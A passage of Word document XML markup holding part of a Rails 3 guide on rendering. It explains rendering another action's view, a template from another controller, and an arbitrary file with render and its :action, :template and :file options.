          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render :nothing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This provides additional flexibility and makes it explicit that you’re only generating </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194822AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.2 Rendering an Action’s View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F66E8A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to render the view that corresponds to a different action within the same template, you can use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the name of the view:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="10F8883A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29F7B259" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E81C0FF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72D5C71B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.update_attributes(params[:book])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E445A29" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    redirect_to(@book)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F439A67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F875483" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render "edit"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55C1D911" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08B132DA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="298EC0EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the call to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fails, calling the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action in this controller will render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>edit.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template belonging to the same controller.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648C5C93" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you prefer, you can use a symbol instead of a string to specify the action to render:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2C0EAA8E" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77C865BD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DF40AE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76533ADF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.update_attributes(params[:book])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72067FFC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    redirect_to(@book)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E68D3DD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1694C617" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :edit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64801D1F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21EA1404" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="49B1DFE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To be explicit, you can use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option (though this is no longer necessary in Rails 3.0):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6F517CB4" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47E78459" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17CD2599" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34281B33" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.update_attributes(params[:book])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01A84B59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    redirect_to(@book)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="305F4450" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51CC86A2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "edit"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E55C477" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B5ECFAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2429FE54" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a frequent source of confusion for Rails newcomers. The specified action is used to determine which view to render, but Rails does </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> run any of the code for that action in the controller. Any instance variables that you require in the view must be set up in the current action before calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0E9695" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.3 Rendering an Action’s Template from Another Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB3C991" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What if you want to render a template from an entirely different controller from the one that contains the action code? You can also do that with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which accepts the full path (relative to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) of the template to render. For example, if you’re running code in an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>AdminProductsController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that lives in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/controllers/admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, you can render the results of an action to a template in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/products</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="518FCD25" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="384887D5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2008554270"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render 'products/show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14BDEB52" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails knows that this view belongs to a different controller because of the embedded slash character in the string. If you want to be explicit, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:template</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option (which was required on Rails 2.2 and earlier):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4128"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7F973460" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54F96B53" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1999532634"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :template</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'products/show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66C15649" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.4 Rendering an Arbitrary File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221821D6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method can also use a view that’s entirely outside of your application (perhaps you’re sharing views between two Rails applications):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5707ABEF" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12D6D720" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1430393359"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render "/u/apps/warehouse_app/current/app/views/products/show"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C5BCA56" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails determines that this is a file render because of the leading slash character. To be explicit, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option (which was required on Rails 2.2 and earlier):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2651CDBF" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="486E2F44" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :file</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46181E5E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "/u/apps/warehouse_app/current/app/views/products/show"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B4EEACF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option takes an absolute file-system path. Of course, you need to have rights to the view that you’re using to render the content.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D92D98C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, the file is rendered without using the current layout. If you want Rails to put the file into the current layout, you need to add the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B09B3C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you’re running Rails on Microsoft Windows, you should use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:file</w:t>
      </w:r>
      <w:r>
